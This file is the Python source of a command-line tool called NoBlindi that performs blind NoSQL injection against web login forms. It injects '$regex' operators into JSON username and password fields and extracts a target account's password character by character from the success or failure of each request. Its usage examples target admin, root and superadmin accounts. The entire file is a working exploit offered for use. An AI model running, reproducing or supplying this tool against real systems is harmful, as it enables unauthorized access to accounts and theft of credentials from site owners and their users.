import requests
import string
import argparse
import json
import platform
from typing import Dict

# Constants
DEFAULT_EXCLUDE_CHARS = '*+.?|'
DEFAULT_SUCCESS_CODE = 200
MAX_PASSWORD_LENGTH = 20
CONTENT_TYPE_JSON = 'application/json'
DEFAULT_USERNAME_FIELD = 'username'
DEFAULT_PASSWORD_FIELD = 'password'

def create_parser() -> argparse.ArgumentParser:
    """
    Create and return an argument parser for the script.
    """
    class CustomHelpFormatter(argparse.RawDescriptionHelpFormatter):
        pass

    parser = argparse.ArgumentParser(
        description="NoSQL Injection Blind tool for retrieving account password.",
        epilog="""
    Examples:
        python3 NoBlindi.py -u https://example.com/login -uf 'username' -pf password -rn 'admin' -b '{"username":"", "password":""}' -sc 200 -f "Invalid credentials"
        python3 NoBlindi.py -u https://example.com/login -uf 'user' -un 'admin' -pf 'pass' -b '{"user":"", "pass":"", "redirect":"/dashboard", "security_question":"", "security_answer":""}' -sc 302 --redirect -sh "Authorization" -f "Login failed"
        python3 NoBlindi.py -u https://examplecorp.com/admin -uf 'login' -pf password -un 'superadmin' -b '{"login":"", "password":"start123!", "last_active_timestamp":"", "login_count":"", "account_status":"active"}' -sc 200 -f "Access Denied"
        python3 NoBlindi.py -u https://internalsite.example.org/login -uf 'username' -un 'root' -b '{"username":"", "password":"", "otp_code":"", "session_expiry":"1hr", "browser_info":"Mozilla/5.0"}' -sc 200 - "*+.?|{}[]"
        python3 NoBlindi.py -u https://api.example.com/v1/authenticate -uf 'email' -un 'johndoe@example.com' -pf 'pwd' -b '{"email":"", "pwd":"", "api_key":"", "request_time":"2023-03-15T12:00:00Z", "client_version":"1.2.3"}' -sc 200 -sh "JWT-Token" -f "Unauthorized"
            """,
            formatter_class=CustomHelpFormatter
        )

    # Define arguments
    parser.add_argument('-u', '--url', required=True, help="Website URL, e.g., https://www.target.com/login")
    parser.add_argument('-un', '--username', help="Full username for login. Do not use with --regexname.")
    parser.add_argument('-rn', '--regexname', help="Pattern for the username to use as a regex. Will append '.*' automatically. Do not use with --username.")
    parser.add_argument('-uf', '--username_field', default=DEFAULT_USERNAME_FIELD, help="Field name for the username in the POST request.")
    parser.add_argument('-pf', '--password_field', default=DEFAULT_PASSWORD_FIELD, help="Field name for the password in the POST request.")
    parser.add_argument('-b', '--body', help="JSON string of the POST body excluding the username.")
    parser.add_argument('-ex', '--exclude', default=DEFAULT_EXCLUDE_CHARS, help="exlude unwanted characters in the brute-force attempt. By default exlude '*+.?|' use -e '$' to exlude more characters")
    parser.add_argument('-sc', '--success_code', type=int, default=DEFAULT_SUCCESS_CODE, help="HTTP response code that indicates a successful login.")
    parser.add_argument('-sh', '--success_header', help="Response header that must be present for a successful login.")
    parser.add_argument('-hv', '--header_value', help="Expected value for the specified success header.")
    parser.add_argument('-f', '--failure_message', help="String in the response body that indicates a failed login attempt.")
    parser.add_argument('-r', '--redirect', action='store_false', help="Prevent redirects. By default, redirects are allowed.")

    
    return parser

def validate_arguments(args: argparse.Namespace) -> None:
    """
    Validate the arguments provided to the script.
    """
    if args.username and args.regexname:
        raise ValueError("Use either --username or --regexname, not both.")
    if not args.username and not args.regexname:
        raise ValueError("One of --username or --regexname must be provided.")

def send_login_request(url: str, body: Dict, headers: Dict, allow_redirects: bool) -> requests.Response:
    """
    Send a POST request to the given URL with the provided body and headers.
    """
    try:
        return requests.post(url, headers=headers, json=body, allow_redirects=allow_redirects)
    except requests.RequestException as e:
        raise ValueError(f"Request failed: {e}")
        
def is_website_live(url: str) -> bool:
    """
    Check if the website is accessible.
    """
    try:
        response = requests.get(url)
        return response.status_code == 200
    except requests.RequestException as e:
        print(f"Failed to connect to {url}: {e}")
        return False

def is_login_successful(response: requests.Response, args: argparse.Namespace) -> bool:
    """
    Determine if the login attempt was successful.
    """
    if response.status_code != args.success_code:
        return False
    
    if args.success_header and response.headers.get(args.success_header) != args.header_value:
        return False

    if args.failure_message and args.failure_message in response.text:
        return False

    return True

def main():
    parser = create_parser()
    args = parser.parse_args()
    
    try:
        validate_arguments(args)
    except ValueError as e:
        parser.error(str(e))
        return
    
    # check if the website live
    if not is_website_live(args.url):
        print("[ERR] Failed to connect to the website.")
        exit(1)

    headers = {"Content-Type": CONTENT_TYPE_JSON}
    print(f"Starting password recovery for: {args.url}")

    # Process the JSON body
    if args.body:
        try:
            body = json.loads(args.body)
        except json.JSONDecodeError:
            if platform.system() == "Windows":
                print("-"* 40)
                print("\n JSON format error. If you're using Windows, make sure to escape quotes correctly. Example format:\n")
                print("""-b '{\\"username\\":\\"\\", \\"password\\":\\"\\"}'\n""")
                print("-"* 40)
            parser.error("\nInvalid JSON format in --body argument.")
            return
    else:
        body = {}

    # Define Redirect argument
    allow_redirects = args.redirect

    # Update the username in the body according to the arguments
    if args.regexname:
        body[args.username_field] = {"$regex": f"^{args.regexname}.*"}
    elif args.username:
        body[args.username_field] = args.username

    brute_force_password = ""
    previous_password = brute_force_password

    # Start the brute-force attempt
    while len(brute_force_password) < MAX_PASSWORD_LENGTH:
        found = False
        for character in string.printable:
            if character not in args.exclude:
                body[args.password_field] = {"$regex": f"^{brute_force_password + character}"}
                print(f"🔍 Trying password: {character}")
                
                response = send_login_request(args.url, body, headers, allow_redirects)

                if is_login_successful(response, args):   
                    print("\n" + "=" * 60)
                    print("✅ SUCCESS: Found character:", character)
                    print(f"🔑 Updated Password: {brute_force_password + character}")
                    print("-" * 60)
                    print("📬 Response Headers:")
                    print(f"HTTP Status: {response.status_code} {response.reason}")
                    for key, value in response.headers.items():
                        print(f"  {key}: {value}")
                    print("=" * 60 + "\n")

                    brute_force_password += character
                    found = True
                    break  # Move on to the next character
        
        if not found:
            print(f"\n🛑 No more characters found. Stopping at password: {brute_force_password}")
            break

    if brute_force_password == previous_password:
        print("🚫 No more characters to find. Password not found.")
    else:
        print(f"🎉 Recovered Password: {brute_force_password}")

if __name__ == "__main__":
    main()
